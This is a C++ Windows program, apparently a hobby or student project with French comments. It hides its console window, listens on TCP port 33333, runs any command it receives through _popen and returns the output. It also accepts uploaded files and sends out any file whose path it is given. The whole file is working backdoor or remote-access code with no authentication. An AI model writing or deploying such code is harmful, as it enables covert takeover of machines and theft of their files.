#undef UNICODE

#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>

// Nos ajouts
#include <string>
#include <direct.h>
#include <vector>
#include <fstream>

// https://stackoverflow.com/questions/478898/how-do-i-execute-a-command-and-get-the-output-of-the-command-within-c-using-po
#include <iostream>
#include <stdexcept>
#include <stdio.h>
#include <string>

// Need to link with Ws2_32.lib
#pragma comment (lib, "Ws2_32.lib")
// #pragma comment (lib, "Mswsock.lib")

#define DEFAULT_BUFLEN 4096
#define DEFAULT_PORT "33333"

using namespace std;

std::string exec(const char* cmd) {
    char buffer[128];
    std::string result = "";

    // Notre ajout
    if (cmd[0] == 'c' && cmd[1] == 'd' && cmd[2] == ' ') {
        string directory = "";
        for (int i = 3; i < strlen(cmd); i++) {
            directory += cmd[i];
        }
        int i = _chdir(directory.c_str());
        return "OKAY CHDIR";
    }

    FILE* pipe = _popen(cmd, "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    try {
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;
        }
    }
    catch (...) {
        _pclose(pipe);
        throw;
    }
    _pclose(pipe);

    // Notre ajout
    if (result == "") {
        return "OKAY";
    }
    return result;
}

int __cdecl main(void)
{
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);    https://stackoverflow.com/questions/18260508/c-how-do-i-hide-a-console-window-on-startup

    WSADATA wsaData;
    int iResult;

    SOCKET ListenSocket = INVALID_SOCKET;
    SOCKET ClientSocket = INVALID_SOCKET;

    struct addrinfo* result = NULL;
    struct addrinfo hints;

    int iSendResult;
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;

    while (true) {
        // Initialize Winsock
        iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
        if (iResult != 0) {
            printf("WSAStartup failed with error: %d\n", iResult);
            return 1;
        }

        ZeroMemory(&hints, sizeof(hints));
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_protocol = IPPROTO_TCP;
        hints.ai_flags = AI_PASSIVE;

        // Resolve the server address and port
        iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
        if (iResult != 0) {
            printf("getaddrinfo failed with error: %d\n", iResult);
            WSACleanup();
            return 1;
        }

        // Create a SOCKET for connecting to server
        ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
        if (ListenSocket == INVALID_SOCKET) {
            printf("socket failed with error: %ld\n", WSAGetLastError());
            freeaddrinfo(result);
            WSACleanup();
            return 1;
        }

        // Setup the TCP listening socket
        iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            printf("bind failed with error: %d\n", WSAGetLastError());
            freeaddrinfo(result);
            closesocket(ListenSocket);
            WSACleanup();
            return 1;
        }

        freeaddrinfo(result);

        iResult = listen(ListenSocket, SOMAXCONN);
        if (iResult == SOCKET_ERROR) {
            printf("listen failed with error: %d\n", WSAGetLastError());
            closesocket(ListenSocket);
            WSACleanup();
            return 1;
        }

        // Accept a client socket
        ClientSocket = accept(ListenSocket, NULL, NULL);
        if (ClientSocket == INVALID_SOCKET) {
            printf("accept failed with error: %d\n", WSAGetLastError());
            closesocket(ListenSocket);
            WSACleanup();
            return 1;
        }

        // No longer need server socket
        // closesocket(ListenSocket); Je l'ai mis en commentaire pour continuer à écouter.

        // Receive until the peer shuts down the connection

        do {

            iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
            if (iResult > 0) {
                printf("Bytes received: %d\n", iResult);
                printf("Message from client: ");

                for (int i = 0; i < iResult; i++)
                {
                    printf("%c", recvbuf[i]);
                }
                printf("\n");

                char* cmd = recvbuf;
                cmd[iResult] = '\0';

                string filestring(cmd, strlen(cmd));
                if (filestring.find("FILETRANSMISSION") == 0) {
                    vector<unsigned char> buffer;

                    string nb_str(cmd, strlen(cmd));
                    nb_str.erase(0, 17);
                    int nb = stoi(nb_str);

                    for (int i = 0; i < nb; i++) {
                        iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
                        if (iResult > 0) {
                            printf("Bytes received: %d\n", iResult);

                            for (int i = 0; i < iResult; i++) {
                                buffer.push_back(recvbuf[i]);
                            }
                        }
                    }

                    // https://stackoverflow.com/questions/15170161/c-winsock-sending-file

                    ofstream output(".\\log.txt", ios::binary);
                    /*if (output.is_open()) {
                        output.write(recvbuf, recvbuflen);
                        ZeroMemory(&recvbuf, recvbuflen);
                    }*/

                    for (auto it : buffer) {
                        output << it;
                    }
                    output.close();
                }
                else if (filestring.find("FILERECEIVE") == 0) {
                    string location = cmd;
                    location.erase(0, 12);
                    ifstream input(location, ios::binary);
                    vector<char> buffer;

                    // get length of file
                    input.seekg(0, input.end);
                    size_t length = input.tellg();
                    input.seekg(0, input.beg);

                    int nb = ceil((float)length / (float)DEFAULT_BUFLEN);
                    string message = "FILETRANSMISSION " + to_string(nb);

                    iResult = send(ClientSocket, message.c_str(), message.size(), 0);
                    if (iResult == SOCKET_ERROR) {
                        printf("send failed with error: %d\n", WSAGetLastError());
                        closesocket(ClientSocket);
                        WSACleanup();
                        return 1;
                    }
                    printf("Bytes Sent: %ld\n", iResult);

                    //read file
                    if (length > 0) {
                        buffer.resize(length);
                        input.read(&buffer[0], length);
                    }

                    int i = 1;
                    string part = "";
                    for (auto it : buffer) {
                        part += it;
                        if (i % DEFAULT_BUFLEN == 0) {
                            iResult = send(ClientSocket, part.c_str(), strlen(part.c_str()), 0);
                            if (iResult == SOCKET_ERROR) {
                                printf("send failed with error: %d\n", WSAGetLastError());
                                closesocket(ClientSocket);
                                WSACleanup();
                                return 1;
                            }
                            printf("Bytes Sent: %ld\n", iResult);

                            i = 0;
                            part.clear();
                        }
                        i++;
                    }
                    iResult = send(ClientSocket, part.c_str(), strlen(part.c_str()), 0);
                    if (iResult == SOCKET_ERROR) {
                        printf("send failed with error: %d\n", WSAGetLastError());
                        closesocket(ClientSocket);
                        WSACleanup();
                        return 1;
                    }
                    printf("Bytes Sent: %ld\n", iResult);
                }
                else {
                    cmd[iResult] = '\0';

                    // https://stackoverflow.com/questions/478898/how-do-i-execute-a-command-and-get-the-output-of-the-command-within-c-using-po

                    string output;
                    output = exec(cmd);

                    // Echo the buffer back to the sender
                    iSendResult = send(ClientSocket, output.c_str(), output.size(), 0);
                    if (iSendResult == SOCKET_ERROR) {
                        printf("send failed with error: %d\n", WSAGetLastError());
                        closesocket(ClientSocket);
                        WSACleanup();
                        return 1;
                    }
                    printf("Bytes sent: %d\n", iSendResult);
                }
            }
            else if (iResult == 0) {
                    printf("Connection closing...\n");
                }
            else {
                    printf("recv failed with error: %d\n", WSAGetLastError());
                    closesocket(ClientSocket);
                    WSACleanup();
                    return 1;
                }
            } while (iResult > 0);

                // shutdown the connection since we're done
                iResult = shutdown(ClientSocket, SD_SEND);
                if (iResult == SOCKET_ERROR) {
                    printf("shutdown failed with error: %d\n", WSAGetLastError());
                    closesocket(ClientSocket);
                    WSACleanup();
                    return 1;
                }

                // cleanup
                closesocket(ClientSocket);
                WSACleanup();
            }

            return 0;
}